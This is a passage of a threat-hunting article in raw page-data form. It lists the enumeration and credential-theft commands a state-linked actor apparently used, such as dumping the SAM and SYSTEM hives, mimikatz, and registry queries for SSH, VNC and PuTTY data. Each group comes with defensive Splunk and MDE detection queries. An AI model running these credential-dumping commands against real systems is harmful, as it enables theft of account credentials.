_181":{"__typename":"Paragraph","id":"dcff7a17d5b3_181","name":"0219","type":"PRE","href":null,"layout":null,"metadata":null,"text":"WmiPreSV.exe, and","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_182":{"__typename":"Paragraph","id":"dcff7a17d5b3_182","name":"0c91","type":"PRE","href":null,"layout":null,"metadata":null,"text":"WmiPrvSE.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_183":{"__typename":"Paragraph","id":"dcff7a17d5b3_183","name":"e91e","type":"H4","href":null,"layout":null,"metadata":null,"text":"Enumeration all","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_184":{"__typename":"Paragraph","id":"dcff7a17d5b3_184","name":"a325","type":"P","href":null,"layout":null,"metadata":null,"text":"The following commands were used by the actor to enumerate the network topology [T1016], the active directory structure [T1069.002], and other information about the target environment [T1069.001], [T1082]:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_185":{"__typename":"Paragraph","id":"dcff7a17d5b3_185","name":"71e7","type":"PRE","href":null,"layout":null,"metadata":null,"text":"arp -a","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"css"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_186":{"__typename":"Paragraph","id":"dcff7a17d5b3_186","name":"3991","type":"PRE","href":null,"layout":null,"metadata":null,"text":"curl www.ip-api.com","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_187":{"__typename":"Paragraph","id":"dcff7a17d5b3_187","name":"3ec9","type":"PRE","href":null,"layout":null,"metadata":null,"text":"dnscmd . \u002Fenumrecords \u002Fzone {REDACTED}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_188":{"__typename":"Paragraph","id":"dcff7a17d5b3_188","name":"8ac0","type":"PRE","href":null,"layout":null,"metadata":null,"text":"dnscmd . \u002Fenumzones","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_189":{"__typename":"Paragraph","id":"dcff7a17d5b3_189","name":"b083","type":"PRE","href":null,"layout":null,"metadata":null,"text":"dnscmd \u002Fenumrecords {REDACTED} . \u002Fadditional","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_190":{"__typename":"Paragraph","id":"dcff7a17d5b3_190","name":"a2d0","type":"PRE","href":null,"layout":null,"metadata":null,"text":"ipconfig \u002Fall","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_191":{"__typename":"Paragraph","id":"dcff7a17d5b3_191","name":"4721","type":"PRE","href":null,"layout":null,"metadata":null,"text":"ldifde.exe -f c:\\windows\\temp\\.txt -p subtree","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"r"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_192":{"__typename":"Paragraph","id":"dcff7a17d5b3_192","name":"bcbf","type":"PRE","href":null,"layout":null,"metadata":null,"text":"net localgroup administrators","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_193":{"__typename":"Paragraph","id":"dcff7a17d5b3_193","name":"4ad8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"net group \u002Fdom","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_194":{"__typename":"Paragraph","id":"dcff7a17d5b3_194","name":"7b4a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"net group “Domain Admins” \u002Fdom","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_195":{"__typename":"Paragraph","id":"dcff7a17d5b3_195","name":"2d1a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh interface firewall show all","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"kotlin"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_196":{"__typename":"Paragraph","id":"dcff7a17d5b3_196","name":"ac0b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh interface portproxy show all","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"kotlin"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_197":{"__typename":"Paragraph","id":"dcff7a17d5b3_197","name":"b623","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh interface portproxy show v4tov4","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"kotlin"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_198":{"__typename":"Paragraph","id":"dcff7a17d5b3_198","name":"c4b1","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh firewall show all","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_199":{"__typename":"Paragraph","id":"dcff7a17d5b3_199","name":"6383","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh portproxy show v4tov4","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_200":{"__typename":"Paragraph","id":"dcff7a17d5b3_200","name":"381c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netstat -ano","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_201":{"__typename":"Paragraph","id":"dcff7a17d5b3_201","name":"6a3e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg query hklm\\software\\ systeminfo tasklist \u002Fv","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_202":{"__typename":"Paragraph","id":"dcff7a17d5b3_202","name":"258c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"whoami","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_203":{"__typename":"Paragraph","id":"dcff7a17d5b3_203","name":"d3a1","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic volume list brief","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_204":{"__typename":"Paragraph","id":"dcff7a17d5b3_204","name":"6692","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic service brief","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_205":{"__typename":"Paragraph","id":"dcff7a17d5b3_205","name":"fd0c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic product list brief","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_206":{"__typename":"Paragraph","id":"dcff7a17d5b3_206","name":"6bd0","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic baseboard list full","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_207":{"__typename":"Paragraph","id":"dcff7a17d5b3_207","name":"4c46","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wevtutil qe security \u002Frd:true \u002Ff:text \u002Fq:*[System[(EventID=4624) and TimeCreated[@SystemTime\u003E=’{REDACTED}’]] and EventData[Data=’{REDACTED}’]]","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_208":{"__typename":"Paragraph","id":"dcff7a17d5b3_208","name":"1b38","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FHunting Query Chinese APT Enumeration of the Environment.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*lob0zTD2WQ3Ong9P"}},"Paragraph:dcff7a17d5b3_209":{"__typename":"Paragraph","id":"dcff7a17d5b3_209","name":"2978","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_210":{"__typename":"Paragraph","id":"dcff7a17d5b3_210","name":"1627","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where (ProcessCommandLine contains @’ipconfig \u002Fall’ or ProcessCommandLine contains @’netsh interface show interface’ or ProcessCommandLine contains @’netsh interface firewall show all’ or ProcessCommandLine contains @’arp -a’ or ProcessCommandLine contains @’nbtstat -n’ or ProcessCommandLine contains @’net config’ or ProcessCommandLine contains @’net group \u002Fdom’ or ProcessCommandLine contains @’net group “Domain Admins” \u002Fdom’ or ProcessCommandLine contains @’route print’ or ProcessCommandLine contains @’curl www.ip-api.com' or ProcessCommandLine contains @’dnscmd’ or ProcessCommandLine contains @’ldifde.exe -f c:\\windows\\temp\\.txt -p subtree’ or ProcessCommandLine contains @’netlocalgroup’ or ProcessCommandLine contains @’netsh interface portproxy show’ or ProcessCommandLine contains @’netstat -ano’ or ProcessCommandLine contains @’reg query hklm\\software\\’ or ProcessCommandLine contains @’systeminfo’ or ProcessCommandLine contains @’tasklist \u002Fv ‘ or ProcessCommandLine contains @’wmic volume list brief’ or ProcessCommandLine contains @’wmic service brief’ or ProcessCommandLine contains @’wmic product list brief’ or ProcessCommandLine contains @’wmic baseboard list brief’ or ProcessCommandLine contains @’wevtutil qe security \u002Frd:true \u002Ff:text \u002Fq:*[System[(EventID=4624) ‘)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_211":{"__typename":"Paragraph","id":"dcff7a17d5b3_211","name":"3b1c","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_212":{"__typename":"Paragraph","id":"dcff7a17d5b3_212","name":"834b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (CommandLine=”*ipconfig \u002Fall*” OR CommandLine=”*netsh interface show interface*” OR CommandLine=”*netsh interface firewall show all*” OR CommandLine=”*arp -a*” OR CommandLine=”*nbtstat -n*” OR CommandLine=”*net config*” OR CommandLine=”*net group \u002Fdom*” OR CommandLine=”*net group \\”Domain Admins\\” \u002Fdom*” OR CommandLine=”*route print*” OR CommandLine=”*curl www.ip-api.com*\" OR CommandLine=”*dnscmd*” OR CommandLine=”*ldifde.exe -f c:\\\\windows\\\\temp\\\\.txt -p subtree*” OR CommandLine=”*netlocalgroup*” OR CommandLine=”*netsh interface portproxy show*” OR CommandLine=”*netstat -ano*” OR CommandLine=”*reg query hklm\\\\software\\\\*” OR CommandLine=”*systeminfo*” OR CommandLine=”*tasklist \u002Fv *” OR CommandLine=”*wmic volume list brief*” OR CommandLine=”*wmic service brief*” OR CommandLine=”*wmic product list brief*” OR CommandLine=”*wmic baseboard list brief*” OR CommandLine=”*wevtutil qe security \u002Frd:true \u002Ff:text \u002Fq:*[System[(EventID=4624) *”)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_213":{"__typename":"Paragraph","id":"dcff7a17d5b3_213","name":"15a1","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_susp_network_command.yml at master ·…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":204,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_susp_network_command.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":92,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":93,"end":194,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_susp_network_command.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*WF2aT_ZjlibgAeDM"}},"Paragraph:dcff7a17d5b3_214":{"__typename":"Paragraph","id":"dcff7a17d5b3_214","name":"458a","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_215":{"__typename":"Paragraph","id":"dcff7a17d5b3_215","name":"a6e8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (CommandLine=”*ipconfig \u002Fall*” OR CommandLine=”*netsh interface show interface*” OR CommandLine=”*arp -a*” OR CommandLine=”*nbtstat -n*” OR CommandLine=”*net config*” OR CommandLine=”*route print*”)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_216":{"__typename":"Paragraph","id":"dcff7a17d5b3_216","name":"7cc0","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_217":{"__typename":"Paragraph","id":"dcff7a17d5b3_217","name":"3161","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where (ProcessCommandLine contains @’ipconfig \u002Fall’ or ProcessCommandLine contains @’netsh interface show interface’ or ProcessCommandLine contains @’arp -a’ or ProcessCommandLine contains @’nbtstat -n’ or ProcessCommandLine contains @’net config’ or ProcessCommandLine contains @’route print’)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_218":{"__typename":"Paragraph","id":"dcff7a17d5b3_218","name":"43c2","type":"H4","href":null,"layout":null,"metadata":null,"text":"Credential Theft","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_219":{"__typename":"Paragraph","id":"dcff7a17d5b3_219","name":"128d","type":"P","href":null,"layout":null,"metadata":null,"text":"The actor also used the following commands to identify additional opportunities for obtaining credentials in the environment [T1555], [T1003]:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_220":{"__typename":"Paragraph","id":"dcff7a17d5b3_220","name":"1a60","type":"PRE","href":null,"layout":null,"metadata":null,"text":"dir C:\\Users\\{REDACTED}\\.ssh\\known_hosts","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_221":{"__typename":"Paragraph","id":"dcff7a17d5b3_221","name":"0b8c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"dir","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_222":{"__typename":"Paragraph","id":"dcff7a17d5b3_222","name":"073b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"C:\\users\\{REDACTED}\\appdata\\roaming\\Mozilla\\firefox\\profile s","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_223":{"__typename":"Paragraph","id":"dcff7a17d5b3_223","name":"be0d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"mimikatz.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_224":{"__typename":"Paragraph","id":"dcff7a17d5b3_224","name":"62ce","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg query hklm\\software\\OpenSSH","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"graphql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_225":{"__typename":"Paragraph","id":"dcff7a17d5b3_225","name":"7985","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg query hklm\\software\\OpenSSH\\Agent","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"graphql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_226":{"__typename":"Paragraph","id":"dcff7a17d5b3_226","name":"313e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg query hklm\\software\\realvnc","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"graphql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_227":{"__typename":"Paragraph","id":"dcff7a17d5b3_227","name":"a38e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg query hklm\\software\\realvnc\\vncserver","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"graphql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_228":{"__typename":"Paragraph","id":"dcff7a17d5b3_228","name":"f696","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg query hklm\\software\\realvnc\\Allusers","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"graphql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_229":{"__typename":"Paragraph","id":"dcff7a17d5b3_229","name":"eb2c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg query hklm\\software\\realvnc\\Allusers\\vncserver","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"graphql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_230":{"__typename":"Paragraph","id":"dcff7a17d5b3_230","name":"4b59","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg query hkcu\\software\\{REDACTED}\\putty\\session","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"graphql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_231":{"__typename":"Paragraph","id":"dcff7a17d5b3_231","name":"4ef8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg save hklm\\sam ss.dat","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_232":{"__typename":"Paragraph","id":"dcff7a17d5b3_232","name":"2f5e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg save hklm\\system sy.dat","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"perl"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_233":{"__typename":"Paragraph","id":"dcff7a17d5b3_233","name":"3891","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_234":{"__typename":"Paragraph","id":"dcff7a17d5b3_234","name":"c4c6","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\reg.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’reg.exe’ or ProcessVersionInfoOriginalFileName =~ @’reg.exe’) and ProcessCommandLine contains @’save’ and (ProcessCommandLine contains @’reg save hklm\\sam ss.dat’ or ProcessCommandLine contains @’reg save hklm\\system sy.dat’ or ProcessCommandLine contains @’reg save hklm\\system’ or ProcessCommandLine contains @’reg save hklm\\sam’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_235":{"__typename":"Paragraph","id":"dcff7a17d5b3_235","name":"fe8a","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_236":{"__typename":"Paragraph","id":"dcff7a17d5b3_236","name":"a139","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\reg.exe” OR OriginalFileName=”reg.exe”) AND CommandLine=”*save*” AND (CommandLine=”*reg save hklm\\\\sam ss.dat*” OR CommandLine=”*reg save hklm\\\\system sy.dat*” OR CommandLine=”*reg save hklm\\\\system*” OR CommandLine=”*reg save hklm\\\\sam*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_237":{"__typename":"Paragraph","id":"dcff7a17d5b3_237","name":"67b3","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FLOLBAS Chinese APT Credential Theft Query Registry Software.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":211,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Credential%20Theft%20Query%20Registry%20Software.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":86,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":87,"end":201,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Credential%20Theft%20Query%20Registry%20Software.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*IZiOcqYxDDJ-W5KX"}},"Paragraph:dcff7a17d5b3_238":{"__typename":"Paragraph","id":"dcff7a17d5b3_238","name":"78b6","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_239":{"__typename":"Paragraph","id":"dcff7a17d5b3_239","name":"f2a2","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\reg.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’reg.exe’ or ProcessVersionInfoOriginalFileName =~ @’reg.exe’) and ProcessCommandLine contains @’query’ and (ProcessCommandLine contains @’reg query hklm\\software\\OpenSSH’ or ProcessCommandLine contains @’reg query hklm\\software\\OpenSSH\\Agent’ or ProcessCommandLine contains @’reg query hklm\\software\\realvnc’ or ProcessCommandLine contains @’reg query hklm\\software\\realvnc\\vncserver’ or ProcessCommandLine contains @’reg query hklm\\software\\realvnc\\Allusers’ or ProcessCommandLine contains @’reg query hklm\\software\\realvnc\\Allusers\\vncserver’ or ProcessCommandLine contains @’reg query hkcu\\software\\*\\putty\\session’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_240":{"__typename":"Paragraph","id":"dcff7a17d5b3_240","name":"c6c3","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_241":{"__typename":"Paragraph","id":"dcff7a17d5b3_241","name":"94a9","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\reg.exe” OR OriginalFileName=”reg.exe”) AND CommandLine=”*query*” AND (CommandLine=”*reg query hklm\\\\software\\\\OpenSSH*” OR CommandLine=”*reg query hklm\\\\software\\\\OpenSSH\\\\Agent*” OR CommandLine=”*reg query hklm\\\\software\\\\realvnc*” OR CommandLine=”*reg query hklm\\\\software\\\\realvnc\\\\vncserver*” OR 